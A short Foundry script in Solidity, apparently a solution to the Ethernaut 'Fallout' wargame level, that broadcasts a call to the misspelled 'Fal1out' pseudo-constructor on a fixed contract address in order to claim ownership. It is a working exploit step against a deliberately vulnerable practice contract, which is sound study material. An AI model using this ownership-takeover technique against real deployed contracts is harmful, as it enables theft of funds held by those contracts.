// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutScript is Script {
    Fallout public fallout;

    function run() external {
        interactions();
    }

    function interactions() public {
        fallout = Fallout(0xEc7f7274aF42A7cB53e3CC562BaDD43AeBddb364);
        vm.startBroadcast();
        fallout.Fal1out{value: 0.0001 ether}();
        vm.stopBroadcast();
    }
}
